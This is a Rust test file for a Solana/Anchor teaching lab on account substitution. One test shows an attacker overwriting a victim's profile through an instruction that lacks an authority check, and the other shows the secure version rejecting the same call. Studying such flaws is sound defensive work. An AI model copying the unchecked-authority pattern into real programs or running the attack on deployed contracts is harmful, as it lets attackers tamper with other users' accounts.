use std::{str::FromStr};

use account_substitution_lab::{
    accounts::{InitializeProfile, SetStatusSecure, SetStatusVulnerable},
    instruction,
    Profile,
};

use anchor_client::{
    Client, Cluster, solana_sdk::{
        commitment_config::CommitmentConfig, native_token::LAMPORTS_PER_SOL, pubkey::Pubkey, signature::{Keypair, read_keypair_file}, signer::Signer, system_instruction, transaction::Transaction
    }
};

fn fund_account(
    program: &anchor_client::Program<std::sync::Arc<anchor_client::solana_sdk::signature::Keypair>>,
    payer: &std::sync::Arc<anchor_client::solana_sdk::signature::Keypair>,
    recipient: &Pubkey,
    amount: u64,
) {
    let recent_blockhash = program.rpc().get_latest_blockhash().unwrap();

    let tx = Transaction::new_signed_with_payer(
        &[system_instruction::transfer(&payer.pubkey(), recipient, amount)],
        Some(&payer.pubkey()),
        &[payer.as_ref()],
        recent_blockhash,
    );

    program.rpc().send_and_confirm_transaction(&tx).unwrap();
}


fn get_program() -> (
    anchor_client::Program<std::sync::Arc<anchor_client::solana_sdk::signature::Keypair>>,
    std::sync::Arc<anchor_client::solana_sdk::signature::Keypair>,
) {
    let anchor_wallet = std::env::var("ANCHOR_WALLET").unwrap();
    let payer = std::sync::Arc::new(read_keypair_file(&anchor_wallet).unwrap());

    let client = Client::new_with_options(
        Cluster::Localnet,
        payer.clone(),
        CommitmentConfig::confirmed(),
    );

    let program = client.program(account_substitution_lab::ID).unwrap();
    (program, payer)
}

#[test]
fn account_substitution_attack_works_on_vulnerable_instruction() {
    let (program, payer) = get_program();

    let victim = Keypair::new();
    let profile = Keypair::new();
    let attacker = Keypair::new();

    // Fund the victim and the attacker

    fund_account(&program, &payer, &victim.pubkey(), LAMPORTS_PER_SOL);
    fund_account(&program, &payer, &attacker.pubkey(), LAMPORTS_PER_SOL);

    println!("victim balance: {}", program.rpc().get_balance(&victim.pubkey()).unwrap());
    println!("attacker balance: {}", program.rpc().get_balance(&attacker.pubkey()).unwrap());

    // Initialize the profile for the victim
    let init_sig = program
            .request()
            .accounts(InitializeProfile{
                profile: profile.pubkey(),
                authority: victim.pubkey(),
                system_program: anchor_client::solana_sdk::system_program::ID,
            })
            .args(instruction::InitializeProfile {
                status: "victim's status".to_string(),
            })
            .signer(&profile)
            .signer(&victim)
            .send();

    assert!(init_sig.is_ok(), "Failed to initialize profile: {:?}", init_sig.err());

    let attack_sig = program
            .request()
            .accounts(SetStatusVulnerable {
                profile: profile.pubkey(),
                authority: attacker.pubkey(),
            })
            .args(instruction::SetStatusVulnerable {
                status: "hacked-by-attacker".to_string(),
            })
            .signer(&attacker)
            .send();

        assert!(
            attack_sig.is_ok(),
            "attacker should succeed against vulnerable instruction"
        );

        let profile_account: Profile = program.account(profile.pubkey()).unwrap();
        assert_eq!(profile_account.authority, victim.pubkey());
        assert_eq!(profile_account.status, "hacked-by-attacker".to_string());

}



#[test]
fn account_substitution_attack_fails_on_secure_instruction() {
    let (program, payer) = get_program();

    let victim = Keypair::new();
    let profile = Keypair::new();
    let attacker = Keypair::new();

    // Fund the victim and the attacker

    fund_account(&program, &payer, &victim.pubkey(), LAMPORTS_PER_SOL);
    fund_account(&program, &payer, &attacker.pubkey(), LAMPORTS_PER_SOL);

    println!("victim balance: {}", program.rpc().get_balance(&victim.pubkey()).unwrap());
    println!("attacker balance: {}", program.rpc().get_balance(&attacker.pubkey()).unwrap());

    // Initialize the profile for the victim

    let init_sig = program
            .request()
            .accounts(InitializeProfile {
                profile: profile.pubkey(),
                authority: victim.pubkey(),
                system_program: anchor_client::solana_sdk::system_program::ID,
            })
            .args(instruction::InitializeProfile {
                status: "victim's status".to_string()
            })
            .signer(&profile)
            .signer(&victim)
            .send();

    assert!(init_sig.is_ok(), "Failed to initialize profile: {:?}", init_sig.err());

    let attack_sig = program.request()
            .accounts(SetStatusSecure {
                profile: profile.pubkey(),
                authority: attacker.pubkey(),
            })
            .args(instruction::SetStatusSecure {
                status: "hacked-by-attacker".to_string(),
            })
            .signer(&attacker)
            .send();

    assert!(
        attack_sig.is_err(),
        "attacker should fail against secure instruction"
    );

    let profile_account: Profile = program.account(profile.pubkey()).unwrap();
    assert_eq!(profile_account.authority, victim.pubkey());
    assert_eq!(profile_account.status, "victim's status".to_string());
}